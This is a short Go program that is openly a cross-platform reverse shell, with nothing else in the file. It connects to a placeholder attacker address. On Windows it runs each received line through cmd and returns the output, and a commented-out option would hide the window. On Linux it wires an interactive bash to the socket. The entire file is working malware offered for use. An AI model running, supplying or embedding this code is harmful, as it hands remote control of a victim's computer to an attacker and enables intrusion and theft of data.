package main

import (
	"bufio"
	"net"
	"os/exec"
	"runtime"
	// "syscall"
)

func executePayload(srcAddress string) {
	targetOs := runtime.GOOS

	conn, _ := net.Dial("tcp", srcAddress)

	switch targetOs {
	case "windows":
		for {
			status, _ := bufio.NewReader(conn).ReadString('\n')
			shell := exec.Command("cmd", "/C", status)
			// shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			output, _ := shell.Output()
			conn.Write([]byte(output))
		}
	case "linux":
		shell := exec.Command("/bin/bash")
		shell.Stdin = conn
		shell.Stdout = conn
		shell.Stderr = conn
		shell.Run()
	}
}

func main() {
	srcAddress := "<ATTACKER_ADDRESS>"
	executePayload(srcAddress)
}
